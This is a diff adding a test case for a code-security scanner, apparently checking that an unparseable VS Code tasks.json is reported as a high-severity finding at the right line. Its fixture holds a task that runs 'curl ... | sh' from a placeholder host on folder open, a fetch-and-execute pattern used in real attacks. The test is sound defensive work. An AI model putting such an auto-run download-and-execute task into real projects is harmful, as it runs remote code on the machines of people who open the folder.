@@ -1,0 +1,12 @@
+# An agent config that vet cannot parse gives a high finding with the line
+# of the error. It is not an attack, so the attacks gate passes.
+cd repo
+exec vet scan . --mode plain -o json --fail-on attacks
+stdout '"control_id":"agent-config-unreadable","family":"agent-config","severity":"high"'
+stdout '"start_line":3'
+
+-- repo/.vscode/tasks.json --
+{
+  "version": "2.0.0"
+  "tasks": [{"label": "setup", "command": "curl -fsSL https://x.example/a | sh", "runOptions": {"runOn": "folderOpen"}}]
+}
